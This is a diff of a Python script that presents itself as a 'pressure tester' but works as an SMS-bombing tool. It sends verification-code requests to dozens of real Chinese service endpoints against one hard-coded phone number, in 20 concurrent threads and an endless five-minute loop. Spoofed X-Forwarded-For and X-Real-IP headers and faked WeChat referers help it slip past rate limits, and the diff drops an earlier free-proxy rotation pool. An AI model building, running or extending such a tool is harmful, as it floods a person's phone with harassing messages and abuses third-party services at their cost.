@@ -5,7 +5,6 @@ import time
 import requests
 import urllib3
 import json
-import re
 from concurrent.futures import ThreadPoolExecutor
 
 # 禁用 SSL 警告
@@ -17,42 +16,16 @@ class PressureTester:
         self.success_count = 0
         self.lock = threading.Lock()
         self.session = requests.Session()
-        self.proxy_list = []  # 代理池
         self.apis = self._init_apis()
-        
-    def _update_proxies(self):
-        """从免费接口抓取并更新代理 IP 池"""
-        print("🌐 正在更新代理池...")
-        try:
-            # 示例使用两个公开代理源
-            urls = [
-                "https://www.89ip.cn/tqdl.html?num=30&address=&killport=&ans=1",
-                "http://www.66ip.cn/mo.php?s_stpw=&num=30&action=getip"
-            ]
-            new_proxies = []
-            for url in urls:
-                r = requests.get(url, timeout=5)
-                ips = re.findall(r'\d+\.\d+\.\d+\.\d+:\d+', r.text)
-                new_proxies.extend(ips)
-            
-            with self.lock:
-                self.proxy_list = list(set(new_proxies))
-            print(f"✅ 代理池更新完成，当前可用数: {len(self.proxy_list)}")
-        except Exception as e:
-            print(f"⚠️ 代理抓取失败: {e}")
-
-    def _get_random_proxy(self):
-        """随机提取一个代理"""
-        if not self.proxy_list:
-            return None
-        proxy = random.choice(self.proxy_list)
-        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
 
     def _init_apis(self):
-        """整合 29+ 接口配置"""
+        """整合 29+ 接口详细配置"""
         p = self.phone
         ts = str(int(time.time()))
+        
+        # 格式: (名称, URL, Method, Data/Params, Is_JSON, Success_Func, Headers)
         return [
+            # --- 原始代码接口 ---
             ("云创动力", "https://jkyc.necloud.com.cn/QXRTOC/user/qxrtoc_wxxcxUserRegistCode", "POST", {"phone": p}, False, lambda r: "成功" in r.text, None),
             ("小熊美术", "https://www.xiaoxiongmeishu.com/api/m/v1/sms/sendCodeV2", "POST", {"bizOrigin": "APP", "mobile": f"+86{p}"}, True, lambda r: r.json().get("code") == 200, None),
             ("供应管理", "https://www.scmmgr.cn/scm//orderRegisterUser/getPollCode", "POST", {"mobileNo": p, "msgType": "2"}, False, lambda r: "成功" in r.text, None),
@@ -60,6 +33,8 @@ class PressureTester:
             ("在线挂号", "https://168api-tyxcx.zaiguahao.com/api/common/smsSend", "POST", {"applets_id": 1352, "phone": p}, True, lambda r: r.json().get("code") == 200, None),
             ("快递100", "https://p.kuaidi100.com/xcx/sms/sendcode", "POST", {"name": p, "validcode": ""}, False, lambda r: r.status_code == 200, None),
             ("鑫汇融资", "http://apiyd.xinhuirongzi.com/user/get-sms-code", "POST", {"mobile": p}, True, lambda r: r.json().get("code") == 200, {"package": "com.dsrz.qianjia", "os": "android"}),
+            
+            # --- 新增整合接口 (部分重构以适应自动化) ---
             ("原子科技", "https://mobilev2.atomychina.com.cn/api/user/web/login/login-send-sms-code", "POST", {"mobile": p, "captcha": "1111", "token": "1111", "prefix": 86}, True, lambda r: r.json().get("code") == 200, None),
             ("智慧云行", "https://apibus.zhihuiyunxing.com/api/v1/common/captcha/send/sms", "POST", f"phone={p}&random=31540959202205610&userType=1&type=PASSENGER_LOGIN_CODE", False, lambda r: r.json().get("code") == 200, {"Content-Type": "application/x-www-form-urlencoded"}),
             ("汽车之家", "https://yczj.api.autohome.com.cn/cus/v1_0_0/api/msite/login/sendVerificationCode", "POST", {"mobile": p, "isDianPing": True, "platform": 4, "version": "2.2.30"}, True, lambda r: r.json().get("returncode") == 0, None),
@@ -87,10 +62,10 @@ class PressureTester:
     def _get_headers(self, extra_headers=None):
         fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
         headers = {
-            "User-Agent": "Mozilla/5.0 (iPhone; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1 MicroMessenger/8.0.20",
             "X-Forwarded-For": fake_ip,
             "X-Real-IP": fake_ip,
-            "Referer": "https://servicewechat.com/",
+            "Referer": "https://servicewechat.com/wx7c8d593b2c3a77/0/page-frame.html",
             "Accept": "application/json, text/plain, */*"
         }
         if extra_headers: headers.update(extra_headers)
@@ -99,55 +74,64 @@ class PressureTester:
     def _send(self, idx):
         name, url, method, data, is_json, check_func, extra = random.choice(self.apis)
         headers = self._get_headers(extra)
-        proxy = self._get_random_proxy() # 获取动态代理
         status = "❌"
         
         try:
             if method == "GET":
-                res = self.session.get(url, params=data, headers=headers, proxies=proxy, timeout=8, verify=False)
+                res = self.session.get(url, params=data, headers=headers, timeout=6, verify=False)
             elif method == "PUT":
-                res = self.session.put(url, json=data if is_json else None, data=None if is_json else data, headers=headers, proxies=proxy, timeout=8, verify=False)
-            else: 
-                res = self.session.post(url, json=data if is_json else None, data=None if is_json else data, headers=headers, proxies=proxy, timeout=8, verify=False)
+                res = self.session.put(url, json=data if is_json else None, data=None if is_json else data, headers=headers, timeout=6, verify=False)
+            else: # POST
+                res = self.session.post(url, json=data if is_json else None, data=None if is_json else data, headers=headers, timeout=6, verify=False)
 
-            if res.status_code in [200, 201, 204] and check_func(res):
-                with self.lock:
-                    self.success_count += 1
-                status = "✅"
+            # 统一状态判断逻辑
+            if res.status_code in [200, 201, 204]:
+                if check_func(res):
+                    with self.lock:
+                        self.success_count += 1
+                    status = "✅"
             
-            p_info = f"({proxy['http'][7:22]})" if proxy else "(DIRECT)"
-            print(f"[{idx:03d}] {status} {name: <6} | {p_info} | 状态: {res.status_code}")
-        except Exception:
-            print(f"[{idx:03d}] ⚠️ {name: <6} | 代理失效或超时")
+            # 缩减输出内容，保持简洁
+            resp_text = res.text[:20].replace('\n', '')
+            print(f"[{idx:03d}] {status} {name: <6} | 状态: {res.status_code} | 响应: {resp_text}")
+        except Exception as e:
+            print(f"[{idx:03d}] ⚠️ {name: <6} | 异常: {str(e)[:15]}")
 
     def start(self, count=100, threads=30):
-        self._update_proxies() # 任务开始前更新代理池
-        print(f"🚀 任务启动 | 目标: {self.phone}")
+        print(f"🚀 任务启动 | 目标: {self.phone} | 接口总数: {len(self.apis)}")
+        print(f"📊 规划: 发送 {count} 次 | 并发数 {threads}")
         start_time = time.time()
         
         with ThreadPoolExecutor(max_workers=threads) as executor:
             executor.map(self._send, range(1, count + 1))
             
+        duration = time.time() - start_time
         print("-" * 60)
-        print(f"📈 总结 | 成功: {self.success_count}/{count} | 耗时: {time.time()-start_time:.1f}s")
+        print(f"📈 任务总结 | 成功: {self.success_count}/{count} | 耗时: {duration:.1f}s")
 
 if __name__ == "__main__":
     # --- 配置区 ---
     PHONE = "13599888558"
-    TOTAL_REQUESTS = 500  
-    MAX_THREADS = 20      
-    INTERVAL = 250        
+    TOTAL_REQUESTS = 100  # 单轮请求数
+    MAX_THREADS = 20      # 并发线程数
+    INTERVAL = 300        # 轮询间隔 (秒)
     # --------------
 
     engine = PressureTester(PHONE)
+    print(f"🔥 全能接口测试引擎已就绪")
     
     try:
         while True:
             engine.success_count = 0
             curr_time = time.strftime("%H:%M:%S", time.localtime())
-            print(f"\n>>> [{curr_time}] 循环开始")
+            print(f"\n>>> [{curr_time}] 任务循环开始...")
+            
             engine.start(count=TOTAL_REQUESTS, threads=MAX_THREADS)
-            print(f"💤 休眠 {INTERVAL//60} 分钟...")
+            
+            print(f"💤 休眠中... 下一轮任务在 {INTERVAL//60} 分钟后开始")
             time.sleep(INTERVAL)
+            
     except KeyboardInterrupt:
-        print("\n👋 已停止。")
+        print("\n👋 任务已由用户停止。")
+    except Exception as e:
+        print(f"\n❌ 程序故障: {e}")
